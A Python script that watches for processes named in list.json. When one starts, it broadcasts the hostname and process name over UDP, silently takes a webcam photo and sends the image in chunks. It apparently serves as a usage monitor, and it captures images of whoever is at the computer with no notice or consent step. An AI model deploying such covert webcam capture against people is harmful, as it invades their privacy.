import socket
import sys
import time
import logging
import cv2
import os
import psutil
import json

logging.basicConfig(filename='error.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# PORT = 9999
PORT = 1145

def load_targets(json_file):
    with open(json_file, 'r') as file:
        data = json.load(file)
    return data["target_processes"]

script_dir = os.path.dirname(os.path.abspath(__file__))
json_file_path = os.path.join(script_dir, 'list.json')
target_processes = load_targets(json_file_path)

base_directory = os.path.dirname(os.path.abspath(__file__))
jpg_path = os.path.join(base_directory, 'capture.jpg')

def capture():
    cap = cv2.VideoCapture(0)
    ret,frame = cap.read()
    if not ret:
        logging.error("Error capturing image: No image captured")
        cap.release()
        return False

    logging.info("captured")
    cv2.imwrite(jpg_path, frame)
    cap.release()
    return True

def sendPic():
    CHUNK_SIZE = 1024
    sockfd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sockfd.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    hostIP = socket.gethostbyname(socket.gethostname())
    des_addr = (hostIP, PORT)

    with open(jpg_path, "rb") as f:
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
            try:
                sockfd.sendto(chunk, des_addr)
            except socket.error as e:
                # print(f"Error sending image chunk: {e}")
                logging.error(f"Error sending image chunk: {e}")
                sys.exit(-1)
    sockfd.sendto(b'END', des_addr)
    # print("Image sent successfully")
    logging.info("Image sent successfully")

with open('list.json', 'r') as f:
    data = json.load(f)
    translations = data["translations"]

def send(process_name):
    translated_name = translations.get(process_name, process_name)
    sockfd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sockfd.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    hostIP = socket.gethostbyname(socket.gethostname())
    des_addr = (hostIP, PORT)
    sendline = socket.gethostname()+":"+translated_name
    try:
        r = sockfd.sendto(sendline.encode(), des_addr)
        if r <= 0:
            logging.error("Error sending message: No data sent")
            # print("No data sent")
            sys.exit(-1)
    except socket.error as e:
        logging.error(f"Error sending message: {e}")
        print(e)
        sys.exit(-1)
    logging.info("finish")
    # print("finish")

def check_process(target_process):
    running_processes = [p.name().lower() for p in psutil.process_iter()]
    if target_process.lower() in running_processes:
        return target_process
    else:
        return None

if __name__ == '__main__':
    while True:
        for process in target_processes:
            if check_process(process):
                send(process)
                capture()
                time.sleep(1)
                sendPic()
                sys.exit(0)
            else:
                time.sleep(0.5)